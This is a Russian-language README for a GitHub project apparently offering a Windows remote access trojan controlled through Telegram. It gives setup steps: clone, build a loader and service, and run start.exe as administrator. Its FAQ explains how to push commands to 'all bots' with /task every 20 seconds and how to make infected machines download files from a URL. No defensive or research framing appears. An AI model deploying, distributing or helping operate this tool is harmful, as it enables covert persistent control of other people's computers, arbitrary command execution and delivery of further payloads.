# Удаленное управление через сервис windows и telegram

<!-- Run Locally -->
### :running: Запуск локально

Клонируем репозиторий

```bash
  git clone https://github.com/xartd0/Windows-RAT-Telegram-Service
```

Заходим в его папку

```bash
  cd Windows-RAT-Telegram-Service
```

Билдим лоадер и сам сервис

```bash
  python builder.py
```

Запускаем start.exe (от им.админа) в папке output

```bash
  start.exe
```

Чтобы лоадер создал сервис, оба файла должны быть в одной папке.

<!-- FAQ -->
## :grey_question: FAQ

- Как управлять ботами?

  + Основная команда, чтобы установить текущее задание для всех ботов - /task (аргумент). Пример /task echo %USERNAME%

- Как остановить задание?

  + Командой /task skip
    
- Как часто выполняется команда?

  + Каждые 20 секунд обноваляется текущая комнда.

- Как скачивать другие файлы?

  + Есть отдельная команда /task download_by_url. Пример: /task download_by_url ссылка на файл
